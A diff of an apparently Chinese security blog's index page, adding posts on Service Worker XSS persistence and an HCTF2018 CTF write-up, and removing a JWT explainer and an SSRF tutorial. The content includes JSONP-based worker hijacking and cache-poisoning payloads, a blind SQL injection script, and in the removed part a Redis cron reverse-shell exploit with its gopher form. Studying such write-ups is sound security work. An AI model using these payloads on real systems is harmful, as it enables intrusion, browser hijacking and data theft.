@@ -90,6 +90,252 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/11/14/RootkitXSS֮ServiceWorker/"> 
+                    RootkitXSS之ServiceWorker 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-11-14   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS测试/">XSS测试</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="RootkitXSS之ServiceWorker"><a href="#RootkitXSS之ServiceWorker" class="headerlink" title="RootkitXSS之ServiceWorker"></a>RootkitXSS之ServiceWorker</h1><p>文章首发于先知：<a href="https://xz.aliyun.com/t/3228#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/3228#toc-10</a></p>
+<p>在拿到一个可以XSS点的时候后，持久化成为一种问题。这几天跟师傅们接触到RootkiXss的一些姿势，受益匪浅</p>
+<h2 id="Serviceworker定义"><a href="#Serviceworker定义" class="headerlink" title="Serviceworker定义"></a>Serviceworker定义</h2><p>Service workers(后文称SW) 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。</p>
+<p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p>
+<h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p>
+<h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/serviceworker.js&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;
+normal visit</code></pre><p>script标签下的type必须指明为<code>text/javascript</code></p>
+<h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p>
+<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p>
+<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response
+self.addEventListener(&#39;fetch&#39;, function (event) {  
+    var url = event.request.clone(); 
+    body = &#39;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&#39;;
+    init = {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }};
+    if(url.url==&#39;http://localhost/reurl.html&#39;){
+        res  = new Response(body,init);
+        event.respondWith(res.clone());
+    }
+});</code></pre><h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
+<p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p>
+<pre><code>&lt;?php
+// JSONP 回调名缺少校验
+$cb_name = $_GET[&#39;callback&#39;];
+$cb_data = time();
+
+header(&#39;Content-Type: application/javascript&#39;);
+echo(&quot;$cb_name($cb_data)&quot;);</code></pre><p>attack_js</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;</code></pre><p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
+<p>或者鸡肋上传一个html到网站下</p>
+<pre><code>&lt;html&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; 
+&lt;body&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;
+it&#39;s nothing
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
+<li>存在有缺陷的 JSONP 接口</li>
+<li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li>
+<li>JSONP 返回的 Content-Type 必须是 JS 类型</li>
+<li>存在 XSS 的页面</li>
+</ul>
+<p>在网上看到一个师傅这样作例,引用一下：<br>service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/sw.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）</p>
+<h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p>
+<h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p>
+<p>下面是一个缓存读取/判断的demo</p>
+<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))
+self.addEventListener(&#39;fetch&#39;, function (event) {  
+        event.respondWith(
+            //console.log(event.request)
+        caches.match(event.request).then(function(res){
+        if(res){//如果有缓存则使用缓存
+        return res;
+        }
+        return requestBackend(event);//没缓存就进行缓存
+        })
+        )
+   });
+
+function requestBackend(event){  
+        var url = event.request.clone();  
+        console.log(url)  //打印内容是打印到请求页面
+        if(url.url==&#39;http://localhost/reurl.html&#39;){//判断是否为需要劫持的资源
+
+        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }})
+        }
+        return fetch(url).then(function(res){
+        //检测是否为有效响应
+        if(!res || res.status !== 200 || res.type !== &#39;basic&#39;){
+        return res;
+        }
+        var response = res.clone();
+        caches.open(&#39;v1&#39;).then(function(cache){  //打开v1缓存进行存储
+        cache.put(event.request, response);
+        });
+
+        return res;
+        })
+}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
+<p>控制台输入下面的恶意代码</p>
+<pre><code>async function replay() {
+    const name = &#39;xx&#39;
+    const url = &#39;xx&#39;
+    const payload = `
+alert(1);
+`
+    let cache = await caches.open(name);
+    let req = new Request(url);
+    let res = new Response(payload + replay + &#39;;replay()&#39;);   //执行alert+写入cache内容+执行fn
+    setInterval(_ =&gt; {
+      cache.put(req, res.clone());
+    }, 500);
+}
+replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p>
+<p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/11/13/HCTF题解/"> 
+                    HCTF2018线上赛部分WriteUp 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-11-13   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="HCTF题解"><a href="#HCTF题解" class="headerlink" title="HCTF题解"></a>HCTF题解</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>提示只有admin才能查看</p>
+<p>注册账号功能，发现注册大写和小写会提示重名注册。<br>也就是说 ADMIN&lt;=&gt;admin</p>
+<p>有一篇文章将Unicode安全，提到的一个python函数canonical_username，这个函数会把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big。ᴬᴬᴬ，经过函数处理<br>后变成了AAA</p>
+<ol>
+<li>我们注册形似ADMIN的名字</li>
+<li>后台函数处理把形似ADMIN转换为ADMIN</li>
+<li>修改ADMIN的密码，相当于修改admin的密码</li>
+<li>登陆admin获得flag</li>
+</ol>
+<p>相当于一个越权</p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Unicode安全：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>Unicode近似字合集:<a href="https://www.compart.com/en/unicode/category/Lm" target="_blank" rel="noopener">https://www.compart.com/en/unicode/category/Lm</a></p>
+<h1 id="kznoe"><a href="#kznoe" class="headerlink" title="kznoe"></a>kznoe</h1><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>拿到题目发现砝码泄露,down了一份<a href="http://www.zip开始审" target="_blank" rel="noopener">www.zip开始审</a></p>
+<p>一眼看到sql文件，打开看看执行了哪些语句，发现后台账号密码</p>
+<pre><code>INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES
+(1, &#39;admin&#39;, &#39;21232f297a57a5a743894a0e4a801fc3&#39;, &#39;小杰&#39;, &#39;1503816935&#39;, 1);</code></pre><p>登陆失败，被改了密码，开始审计</p>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>整个钓鱼网站的大致结构：<br><img src="https://i.loli.net/2018/11/13/5beac350d6b8e.png" alt><br>根目录index.php跳转页</p>
+<h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>admin目录下是钓鱼后台的管理,login逻辑判断登陆</p>
+<h3 id="include目录。"><a href="#include目录。" class="headerlink" title="include目录。"></a>include目录。</h3><p>include下是配置文件，common入口文件包含了过滤和验证内容，其中:</p>
+<ol>
+<li>safe.php写了过滤规则，任何GET\POST\COOKIE请求的参数会经过filter<pre><code>function waf($string)
+{
+ $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;; // and updatexml(1,concat(0x7e,database())
+ return preg_replace_callback($blacklist, function ($match) {
+     return &#39;@&#39; . $match[0] . &#39;@&#39;;
+ }, $string);
+}
+</code></pre></li>
+</ol>
+<p>function safe($string)<br>{<br>    if (is_array($string)) {<br>        foreach ($string as $key =&gt; $val) {<br>            $string[$key] = safe($val);<br>        }<br>    } else {<br>        $string = waf($string);<br>    }<br>    return $string;<br>}</p>
+<pre><code>匹配到这些会在关键字前后添加@
+
+2. member根据cookie判断是否已经登陆
+3. founction封装了一些功能函数
+4. db.class一些执行的sql语句
+
+## 思路
+### ip
+刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的：
+![](https://i.loli.net/2018/11/13/5beac380388eb.jpg)
+不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通
+
+### bypass
+因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。
+
+### member.php
+当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方
+
+![](https://i.loli.net/2018/11/13/5beac35ebedb4.png)
+
+cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤
+![](https://i.loli.net/2018/11/13/5beac38e39abe.png)
+
+剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来</code></pre><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import requests<br>import string</p>
+<p>url = ‘<a href="http://kzone.2018.hctf.io/include/common.php&#39;" target="_blank" rel="noopener">http://kzone.2018.hctf.io/include/common.php&#39;</a><br>str1 = string.ascii_letters+string.digits+’{}!@#$*&amp;_,’</p>
+<p>def check(payload):<br>    cookie={<br>        ‘PHPSESSID’:’8ehnp28ccr4ueh3gnfc3uqtau1’,<br>        ‘islogin’:’1’,<br>        ‘login_data’:payload<br>    }<br>    try:<br>        requests.get(url,cookies=cookie,timeout=3)<br>        return 0<br>    except:<br>        return 1</p>
+<p>result=’’<br>for i in range(1,33):<br>    for j in str1:<br>        payload = ‘{“admin_user”:”admin&#39;/<strong>/and/</strong>/\u0069f(\u0061scii(\u0073ubstr((select/<strong>/table_name/</strong>/from/<strong>/inf\u006Frmation_schema.tables/</strong>/where/<strong>/table_schema\u003ddatabase()/</strong>/limit/<strong>/0,1),%s,1))\u003d&#39;%s&#39;,\u0073leep(4),1)/</strong>/and/<strong>/&#39;1”}’% (str(i),ord(j))<br>        payload = ‘{“admin_user”:”admin&#39;/</strong>/and/<strong>/\u0069f(\u0061scii(\u0073ubstr((select/</strong>/F1a9/<strong>/from/</strong>/F1444g),%s,1))\u003d%s,\u0073leep(4),1)/<strong>/and/</strong>/&#39;1”,”admin_pass”:”123”}’% (str(i),ord(j))<br>        #print(‘[+]’+payload)<br>        if check(payload):<br>            result += j<br>            break<br>    print(result)</p>
+<pre><code>
+只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php
+
+
+
+
+</code></pre>
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/11/13/HCTF题解/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/10/22/ISCC2018 信阳杯线下赛小结/"> 
                     ISCC2018 信阳杯线下赛小结 
                 </a>
@@ -1087,224 +1333,6 @@ if __name__ == &#39;__main__&#39;:
             </div>
             <div class="continue">
             <a href="/2018/08/18/代码审计复现：Bluecms 1.6/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/12/（转载） 基于 Token 的身份验证/"> 
-                    (转载)基于 Token 的身份验证 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-12   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="传统身份验证的方法"><a href="#传统身份验证的方法" class="headerlink" title="传统身份验证的方法"></a>传统身份验证的方法</h2><p>HTTP 是一种没有状态的协议，也就是它并不知道是谁是访问应用。这里我们把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下。</p>
-<p>解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的 ID 号发送给客户端，客户端收到以后把这个 ID 号存储在 Cookie 里，下次这个用户再向服务端发送请求的时候，可以带着这个 Cookie ，这样服务端会验证一个这个 Cookie 里的信息，看看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。</p>
-<p>上面说的就是 Session，我们需要在服务端存储为登录的用户生成的 Session ，这些 Session 可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的 Session 。</p>
-<h2 id="基于-Token-的身份验证方法"><a href="#基于-Token-的身份验证方法" class="headerlink" title="基于 Token 的身份验证方法"></a>基于 Token 的身份验证方法</h2><p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
-<ul>
-<li><p>客户端使用用户名跟密码请求登录</p>
-</li>
-<li><p>服务端收到请求，去验证用户名与密码</p>
-</li>
-<li><p>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p>
-</li>
-<li><p>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p>
-</li>
-<li><p>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p>
-</li>
-<li><p>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p>
-</li>
-</ul>
-<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>实施 Token 验证的方法挺多的，还有一些标准方法，比如 JWT，读作：jot ，表示：JSON Web Tokens 。JWT 标准的 Token 有三个部分：</p>
-<ul>
-<li><p>header</p>
-</li>
-<li><p>payload</p>
-</li>
-<li><p>signature</p>
-</li>
-</ul>
-<p>中间用点分隔开，并且都会使用 Base64 编码，所以真正的 Token 看起来像这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header 部分主要是两部分内容，一个是 Token 的类型，另一个是使用的算法，比如下面类型就是 JWT，使用的算法是 HS256。</p>
-<p>{</p>
-<p>  “typ”: “JWT”,</p>
-<p>  “alg”: “HS256”</p>
-<p>}</p>
-<p>上面的内容要用 Base64 的形式编码一下，所以就变成这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</p>
-<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload 里面是 Token 的具体内容，这些内容里面有一些是标准字段，你也可以添加其它需要的内容。下面是标准字段：</p>
-<ul>
-<li><p>iss：Issuer，发行者</p>
-</li>
-<li><p>sub：Subject，主题</p>
-</li>
-<li><p>aud：Audience，观众</p>
-</li>
-<li><p>exp：Expiration time，过期时间</p>
-</li>
-<li><p>nbf：Not before</p>
-</li>
-<li><p>iat：Issued at，发行时间</p>
-</li>
-<li><p>jti：JWT ID</p>
-</li>
-</ul>
-<p>比如下面这个 Payload ，用到了 iss 发行人，还有 exp 过期时间。另外还有两个自定义的字段，一个是 name ，还有一个是 admin 。</p>
-<p>{</p>
-<p> “iss”: “ninghao.net”,</p>
-<p> “exp”: “1438955445”,</p>
-<p> “name”: “wanghao”,</p>
-<p> “admin”: true</p>
-<p>}</p>
-<p>使用 Base64 编码以后就变成了这个样子：</p>
-<p>eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ</p>
-<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>JWT 的最后一部分是 Signature ，这部分内容有三个部分，先是用 Base64 编码的 header.payload ，再用加密算法加密一下，加密的时候要放进去一个 Secret ，这个相当于是一个密码，这个密码秘密地存储在服务端。</p>
-<ul>
-<li><p>header</p>
-</li>
-<li><p>payload</p>
-</li>
-<li><p>secret</p>
-</li>
-</ul>
-<p>var encodedString = base64UrlEncode(header) + “.” + base64UrlEncode(payload);</p>
-<p>HMACSHA256(encodedString, ‘secret’);</p>
-<p>处理完成以后看起来像这样：</p>
-<p>SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<p>最后这个在服务端生成并且要发送给客户端的 Token 看起来像这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<p>客户端收到这个 Token 以后把它存储下来，下回向服务端发送请求的时候就带着这个 Token 。服务端收到这个 Token ，然后进行验证，通过以后就会返回给客户端想要的资源。</p>
-<h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p>本文转载自<a href="https://ninghao.net/blog/2834" target="_blank" rel="noopener">https://ninghao.net/blog/2834</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/10/初探ssrf/"> 
-                    初探ssrf 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-10   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/">webshell</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>ssrf是很常见的一个漏洞，一开始把ssrf简单的理解为链接重定向漏洞，其实也可以这么说，曾经这个漏洞影响过许多互联网企业。</p>
-<p>危害有如下几个类型:</p>
-<p>内网端口扫描<br>内网Web应用指纹识别<br>通过访问内网Web应用robots.txt等方式辨别cms的类型及版本然后根据公开的漏洞去攻击内网服务器<br>读取本地文件<br>读取远程文件<br>攻击内网其他应用,如redis,从而反弹shell</p>
-<h2 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h2><h3 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h3><p>curl是一个利用URL语法在命令行方式下工作的文件传输工具。PHP中有cURL的苦，叫libcurl，支持许多协议：FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP。curl同样支持HTTPS认证，HTTP POST方法, HTTP PUT方法, FTP上传, kerberos认证, HTTP上传, 代理服务器, cookies, 用户名/密码认证, 下载文件、</p>
-<p>我们可以利用curl进行抓取网页内容</p>
-<h3 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h3><p>通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。</p>
-<p>类似于这样的形式：</p>
-<pre><code>ip:port/ssrf.php?url=xxxx</code></pre><p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
-<p>但是，如果我们通过curl允许的协议来传递给url这个参数一些邪恶的信息呢？后果可想而知</p>
-<h2 id="SSRF分析"><a href="#SSRF分析" class="headerlink" title="SSRF分析"></a>SSRF分析</h2><h3 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h3><p>ssrf漏洞代码，未作过滤</p>
-<pre><code>&lt;?php 
-// 创建一个新cURL资源
-$ch = curl_init(); 
-
-// 设置URL和相应的选项
-curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); 
-curl_setopt($ch, CURLOPT_HEADER, 0); 
-
-// 抓取URL并把它传递给浏览器
-curl_exec($ch); 
-
-// 关闭cURL资源，并且释放系统资源
-curl_close($ch); 
-?&gt;</code></pre><h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
-<p>我们url传入的file协议语句，会在服务会执行一个curl语句，返回查询的信息。这个是基于有回显的情况，不过现在很多php后端如果这样写的话：</p>
-<pre><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</code></pre><p>协议就算失效了，这种方法失败</p>
-<h3 id="dict协议探测端口"><a href="#dict协议探测端口" class="headerlink" title="dict协议探测端口"></a>dict协议探测端口</h3><p>探测22端口(ssh服务)</p>
-<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</code></pre><p>服务端会执行：</p>
-<pre><code>curl -v &#39;dict://127.0.0.1:22/info&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
-<p>探测3306端口</p>
-<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:3306
-/info</code></pre><h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
-<pre><code>redis-cli -h $1 flushall
-echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1
-redis-cli -h $1 config set dir /var/spool/cron/
-redis-cli -h $1 config set dbfilename root
-redis-cli -h $1 save</code></pre><p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
-<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
-<p>代码如下：</p>
-<pre><code>function curl($url){
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
-// 限制为HTTPS、HTTP协议
-curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
